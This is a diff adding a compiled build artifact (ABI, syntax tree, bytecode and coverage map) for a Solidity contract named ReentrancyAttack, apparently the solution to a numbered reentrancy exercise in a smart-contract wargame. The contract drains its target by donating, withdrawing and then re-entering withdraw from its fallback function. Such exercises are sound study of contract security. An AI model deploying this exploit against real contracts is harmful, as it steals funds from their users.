@@ -1,0 +1,4554 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address payable",
+          "name": "_addr",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "fallback"
+    },
+    {
+      "inputs": [],
+      "name": "amount",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "getBalance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "reentrancyContract",
+      "outputs": [
+        {
+          "internalType": "contract Reentrance",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "1": "/Users/nvtrang/.brownie/packages/OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/math/SafeMath.sol",
+    "15": "contracts/10_Reentrancy/Reentrancy.sol",
+    "16": "contracts/10_Reentrancy/ReentrancyAttack.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/10_Reentrancy/ReentrancyAttack.sol",
+    "exportedSymbols": {
+      "ReentrancyAttack": [
+        643
+      ]
+    },
+    "id": 644,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 565,
+        "literals": [
+          "solidity",
+          "^",
+          "0.6",
+          ".4"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "32:23:16"
+      },
+      {
+        "absolutePath": "contracts/10_Reentrancy/Reentrancy.sol",
+        "file": "./Reentrancy.sol",
+        "id": 566,
+        "nodeType": "ImportDirective",
+        "scope": 644,
+        "sourceUnit": 564,
+        "src": "57:26:16",
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "documentation": null,
+        "fullyImplemented": true,
+        "id": 643,
+        "linearizedBaseContracts": [
+          643
+        ],
+        "name": "ReentrancyAttack",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "functionSelector": "61ec2634",
+            "id": 568,
+            "mutability": "mutable",
+            "name": "reentrancyContract",
+            "nodeType": "VariableDeclaration",
+            "overrides": null,
+            "scope": 643,
+            "src": "117:36:16",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_Reentrance_$563",
+              "typeString": "contract Reentrance"
+            },
+            "typeName": {
+              "contractScope": null,
+              "id": 567,
+              "name": "Reentrance",
+              "nodeType": "UserDefinedTypeName",
+              "referencedDeclaration": 563,
+              "src": "117:10:16",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_Reentrance_$563",
+                "typeString": "contract Reentrance"
+              }
+            },
+            "value": null,
+            "visibility": "public"
+          },
+          {
+            "constant": false,
+            "functionSelector": "aa8c217c",
+            "id": 571,
+            "mutability": "mutable",
+            "name": "amount",
+            "nodeType": "VariableDeclaration",
+            "overrides": null,
+            "scope": 643,
+            "src": "159:32:16",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_uint256",
+              "typeString": "uint256"
+            },
+            "typeName": {
+              "id": 569,
+              "name": "uint",
+              "nodeType": "ElementaryTypeName",
+              "src": "159:4:16",
+              "typeDescriptions": {
+                "typeIdentifier": "t_uint256",
+                "typeString": "uint256"
+              }
+            },
+            "value": {
+              "argumentTypes": null,
+              "hexValue": "302e303031",
+              "id": 570,
+              "isConstant": false,
+              "isLValue": false,
+              "isPure": true,
+              "kind": "number",
+              "lValueRequested": false,
+              "nodeType": "Literal",
+              "src": "180:11:16",
+              "subdenomination": "ether",
+              "typeDescriptions": {
+                "typeIdentifier": "t_rational_1000000000000000_by_1",
+                "typeString": "int_const 1000000000000000"
+              },
+              "value": "0.001"
+            },
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 582,
+              "nodeType": "Block",
+              "src": "252:55:16",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "id": 580,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "argumentTypes": null,
+                      "id": 576,
+                      "name": "reentrancyContract",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 568,
+                      "src": "262:18:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Reentrance_$563",
+                        "typeString": "contract Reentrance"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "argumentTypes": null,
+                      "arguments": [
+                        {
+                          "argumentTypes": null,
+                          "id": 578,
+                          "name": "_addr",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 573,
+                          "src": "294:5:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        ],
+                        "id": 577,
+                        "name": "Reentrance",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 563,
+                        "src": "283:10:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_Reentrance_$563_$",
+                          "typeString": "type(contract Reentrance)"
+                        }
+                      },
+                      "id": 579,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "283:17:16",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Reentrance_$563",
+                        "typeString": "contract Reentrance"
+                      }
+                    },
+                    "src": "262:38:16",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_Reentrance_$563",
+                      "typeString": "contract Reentrance"
+                    }
+                  },
+                  "id": 581,
+                  "nodeType": "ExpressionStatement",
+                  "src": "262:38:16"
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 583,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 574,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 573,
+                  "mutability": "mutable",
+                  "name": "_addr",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 583,
+                  "src": "214:21:16",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address_payable",
+                    "typeString": "address payable"
+                  },
+                  "typeName": {
+                    "id": 572,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "214:15:16",
+                    "stateMutability": "payable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address_payable",
+                      "typeString": "address payable"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "213:23:16"
+            },
+            "returnParameters": {
+              "id": 575,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "252:0:16"
+            },
+            "scope": 643,
+            "src": "202:105:16",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 601,
+              "nodeType": "Block",
+              "src": "420:127:16",
+              "statements": [
+                {
+                  "condition": {
+                    "argumentTypes": null,
+                    "commonType": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    },
+                    "id": 592,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftExpression": {
+                      "argumentTypes": null,
+                      "expression": {
+                        "argumentTypes": null,
+                        "arguments": [
+                          {
+                            "argumentTypes": null,
+                            "id": 588,
+                            "name": "reentrancyContract",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 568,
+                            "src": "442:18:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_Reentrance_$563",
+                              "typeString": "contract Reentrance"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_Reentrance_$563",
+                              "typeString": "contract Reentrance"
+                            }
+                          ],
+                          "id": 587,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "434:7:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 586,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "434:7:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": null,
+                              "typeString": null
+                            }
+                          }
+                        },
+                        "id": 589,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "434:27:16",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      },
+                      "id": 590,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "balance",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": null,
+                      "src": "434:35:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "nodeType": "BinaryOperation",
+                    "operator": ">=",
+                    "rightExpression": {
+                      "argumentTypes": null,
+                      "id": 591,
+                      "name": "amount",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 571,
+                      "src": "473:6:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "src": "434:45:16",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "falseBody": null,
+                  "id": 600,
+                  "nodeType": "IfStatement",
+                  "src": "430:111:16",
+                  "trueBody": {
+                    "id": 599,
+                    "nodeType": "Block",
+                    "src": "481:60:16",
+                    "statements": [
+                      {
+                        "expression": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            {
+                              "argumentTypes": null,
+                              "id": 596,
+                              "name": "amount",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 571,
+                              "src": "523:6:16",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_uint256",
+                                "typeString": "uint256"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_uint256",
+                                "typeString": "uint256"
+                              }
+                            ],
+                            "expression": {
+                              "argumentTypes": null,
+                              "id": 593,
+                              "name": "reentrancyContract",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 568,
+                              "src": "495:18:16",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_Reentrance_$563",
+                                "typeString": "contract Reentrance"
+                              }
+                            },
+                            "id": 595,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "withdraw",
+                            "nodeType": "MemberAccess",
+                            "referencedDeclaration": 558,
+                            "src": "495:27:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
+                              "typeString": "function (uint256) external"
+                            }
+                          },
+                          "id": 597,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "495:35:16",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_tuple$__$",
+                            "typeString": "tuple()"
+                          }
+                        },
+                        "id": 598,
+                        "nodeType": "ExpressionStatement",
+                        "src": "495:35:16"
+                      }
+                    ]
+                  }
+                }
+              ]
+            },
+            "documentation": null,
+            "id": 602,
+            "implemented": true,
+            "kind": "fallback",
+            "modifiers": [],
+            "name": "",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 584,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "400:2:16"
+            },
+            "returnParameters": {
+              "id": 585,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "420:0:16"
+            },
+            "scope": 643,
+            "src": "392:155:16",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "body": {
+              "id": 629,
+              "nodeType": "Block",
+              "src": "588:160:16",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "commonType": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        },
+                        "id": 609,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "leftExpression": {
+                          "argumentTypes": null,
+                          "expression": {
+                            "argumentTypes": null,
+                            "id": 606,
+                            "name": "msg",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -15,
+                            "src": "606:3:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_magic_message",
+                              "typeString": "msg"
+                            }
+                          },
+                          "id": 607,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberName": "value",
+                          "nodeType": "MemberAccess",
+                          "referencedDeclaration": null,
+                          "src": "606:9:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        },
+                        "nodeType": "BinaryOperation",
+                        "operator": ">=",
+                        "rightExpression": {
+                          "argumentTypes": null,
+                          "hexValue": "302e303031",
+                          "id": 608,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "kind": "number",
+                          "lValueRequested": false,
+                          "nodeType": "Literal",
+                          "src": "619:11:16",
+                          "subdenomination": "ether",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_rational_1000000000000000_by_1",
+                            "typeString": "int_const 1000000000000000"
+                          },
+                          "value": "0.001"
+                        },
+                        "src": "606:24:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_bool",
+                          "typeString": "bool"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_bool",
+                          "typeString": "bool"
+                        }
+                      ],
+                      "id": 605,
+                      "name": "require",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [
+                        -18,
+                        -18
+                      ],
+                      "referencedDeclaration": -18,
+                      "src": "598:7:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
+                        "typeString": "function (bool) pure"
+                      }
+                    },
+                    "id": 610,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "598:33:16",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 611,
+                  "nodeType": "ExpressionStatement",
+                  "src": "598:33:16"
+                },
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "arguments": [
+                          {
+                            "argumentTypes": null,
+                            "id": 619,
+                            "name": "this",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -28,
+                            "src": "690:4:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_ReentrancyAttack_$643",
+                              "typeString": "contract ReentrancyAttack"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_ReentrancyAttack_$643",
+                              "typeString": "contract ReentrancyAttack"
+                            }
+                          ],
+                          "id": 618,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "682:7:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 617,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "682:7:16",
+                            "typeDescriptions": {
+                              "typeIdentifier": null,
+                              "typeString": null
+                            }
+                          }
+                        },
+                        "id": 620,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "682:13:16",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": null,
+                          "id": 612,
+                          "name": "reentrancyContract",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 568,
+                          "src": "641:18:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_Reentrance_$563",
+                            "typeString": "contract Reentrance"
+                          }
+                        },
+                        "id": 614,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberName": "donate",
+                        "nodeType": "MemberAccess",
+                        "referencedDeclaration": 510,
+                        "src": "641:25:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_function_external_payable$_t_address_$returns$__$",
+                          "typeString": "function (address) payable external"
+                        }
+                      },
+                      "id": 616,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "names": [
+                        "value"
+                      ],
+                      "nodeType": "FunctionCallOptions",
+                      "options": [
+                        {
+                          "argumentTypes": null,
+                          "id": 615,
+                          "name": "amount",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 571,
+                          "src": "674:6:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        }
+                      ],
+                      "src": "641:40:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_payable$_t_address_$returns$__$value",
+                        "typeString": "function (address) payable external"
+                      }
+                    },
+                    "id": 621,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "641:55:16",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 622,
+                  "nodeType": "ExpressionStatement",
+                  "src": "641:55:16"
+                },
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "arguments": [
+                      {
+                        "argumentTypes": null,
+                        "id": 626,
+                        "name": "amount",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 571,
+                        "src": "734:6:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": null,
+                        "id": 623,
+                        "name": "reentrancyContract",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 568,
+                        "src": "706:18:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_Reentrance_$563",
+                          "typeString": "contract Reentrance"
+                        }
+                      },
+                      "id": 625,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "withdraw",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 558,
+                      "src": "706:27:16",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
+                        "typeString": "function (uint256) external"
+                      }
+                    },
+                    "id": 627,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "706:35:16",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 628,
+                  "nodeType": "ExpressionStatement",
+                  "src": "706:35:16"
+                }
+              ]
+            },
+            "documentation": null,
+            "functionSelector": "9e5faafc",
+            "id": 630,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 603,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "568:2:16"
+            },
+            "returnParameters": {
+              "id": 604,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "588:0:16"
+            },
+            "scope": 643,
+            "src": "553:195:16",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "body": {
+              "id": 641,
+              "nodeType": "Block",
+              "src": "803:45:16",
+              "statements": [
+                {
+                  "expression": {
+                    "argumentTypes": null,
+                    "expression": {
+                      "argumentTypes": null,
+                      "arguments": [
+                        {
+                          "argumentTypes": null,
+                          "id": 637,
+                          "name": "this",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": -28,
+                          "src": "828:4:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_ReentrancyAttack_$643",
+                            "typeString": "contract ReentrancyAttack"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_contract$_ReentrancyAttack_$643",
+                            "typeString": "contract ReentrancyAttack"
+                          }
+                        ],
+                        "id": 636,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "820:7:16",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_$",
+                          "typeString": "type(address)"
+                        },
+                        "typeName": {
+                          "id": 635,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "820:7:16",
+                          "typeDescriptions": {
+                            "typeIdentifier": null,
+                            "typeString": null
+                          }
+                        }
+                      },
+                      "id": 638,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "820:13:16",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address_payable",
+                        "typeString": "address payable"
+                      }
+                    },
+                    "id": 639,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "balance",
+                    "nodeType": "MemberAccess",
+                    "referencedDeclaration": null,
+                    "src": "820:21:16",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "functionReturnParameters": 634,
+                  "id": 640,
+                  "nodeType": "Return",
+                  "src": "813:28:16"
+                }
+              ]
+            },
+            "documentation": null,
+            "functionSelector": "12065fe0",
+            "id": 642,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "getBalance",
+            "nodeType": "FunctionDefinition",
+            "overrides": null,
+            "parameters": {
+              "id": 631,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "773:2:16"
+            },
+            "returnParameters": {
+              "id": 634,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 633,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nodeType": "VariableDeclaration",
+                  "overrides": null,
+                  "scope": 642,
+                  "src": "797:4:16",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 632,
+                    "name": "uint",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "797:4:16",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "value": null,
+                  "visibility": "internal"
+                }
+              ],
+              "src": "796:6:16"
+            },
+            "scope": 643,
+            "src": "754:94:16",
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "public"
+          }
+        ],
+        "scope": 644,
+        "src": "85:765:16"
+      }
+    ],
+    "src": "32:818:16"
+  },
+  "bytecode": "608060405266038d7ea4c680006001556040516102bc3803806102bc8339818101604052602081101561003157600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610259806100636000396000f3fe60806040526004361061003f5760003560e01c806312065fe0146100ba57806361ec2634146100e15780639e5faafc14610112578063aa8c217c1461011a575b6001546000546001600160a01b031631106100b8576000805460015460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561009f57600080fd5b505af11580156100b3573d6000803e3d6000fd5b505050505b005b3480156100c657600080fd5b506100cf61012f565b60408051918252519081900360200190f35b3480156100ed57600080fd5b506100f6610133565b604080516001600160a01b039092168252519081900360200190f35b6100b8610142565b34801561012657600080fd5b506100cf61021d565b4790565b6000546001600160a01b031681565b66038d7ea4c6800034101561015657600080fd5b600080546001546040805162362a9560e01b815230600482015290516001600160a01b039093169362362a959360248084019382900301818588803b15801561019e57600080fd5b505af11580156101b2573d6000803e3d6000fd5b50506000805460015460408051632e1a7d4d60e01b81526004810192909252516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b50505050565b6001548156fea26469706673582212203621e340ed422595b3733806b599afd229d36405fc94f541d6497bb4e7ef1f5664736f6c634300060c0033",
+  "bytecodeSha1": "9ee41188441250ed028082d8e375856cb5fa72f4",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.6.12+commit.27d51765"
+  },
+  "contractName": "ReentrancyAttack",
+  "coverageMap": {
+    "branches": {
+      "1": {},
+      "15": {},
+      "16": {
+        "ReentrancyAttack.<fallback>": {
+          "5": [
+            434,
+            479,
+            false
+          ]
+        },
+        "ReentrancyAttack.attack": {
+          "6": [
+            606,
+            630,
+            true
+          ]
+        }
+      }
+    },
+    "statements": {
+      "1": {},
+      "15": {},
+      "16": {
+        "ReentrancyAttack.<fallback>": {
+          "0": [
+            495,
+            530
+          ]
+        },
+        "ReentrancyAttack.attack": {
+          "2": [
+            598,
+            631
+          ],
+          "3": [
+            641,
+            696
+          ],
+          "4": [
+            706,
+            741
+          ]
+        },
+        "ReentrancyAttack.getBalance": {
+          "1": [
+            813,
+            841
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [
+    "Reentrance",
+    "OpenZeppelin/openzeppelin-contracts@3.0.0/SafeMath"
+  ],
+  "deployedBytecode": "60806040526004361061003f5760003560e01c806312065fe0146100ba57806361ec2634146100e15780639e5faafc14610112578063aa8c217c1461011a575b6001546000546001600160a01b031631106100b8576000805460015460408051632e1a7d4d60e01b81526004810192909252516001600160a01b0390921692632e1a7d4d9260248084019382900301818387803b15801561009f57600080fd5b505af11580156100b3573d6000803e3d6000fd5b505050505b005b3480156100c657600080fd5b506100cf61012f565b60408051918252519081900360200190f35b3480156100ed57600080fd5b506100f6610133565b604080516001600160a01b039092168252519081900360200190f35b6100b8610142565b34801561012657600080fd5b506100cf61021d565b4790565b6000546001600160a01b031681565b66038d7ea4c6800034101561015657600080fd5b600080546001546040805162362a9560e01b815230600482015290516001600160a01b039093169362362a959360248084019382900301818588803b15801561019e57600080fd5b505af11580156101b2573d6000803e3d6000fd5b50506000805460015460408051632e1a7d4d60e01b81526004810192909252516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b50505050565b6001548156fea26469706673582212203621e340ed422595b3733806b599afd229d36405fc94f541d6497bb4e7ef1f5664736f6c634300060c0033",
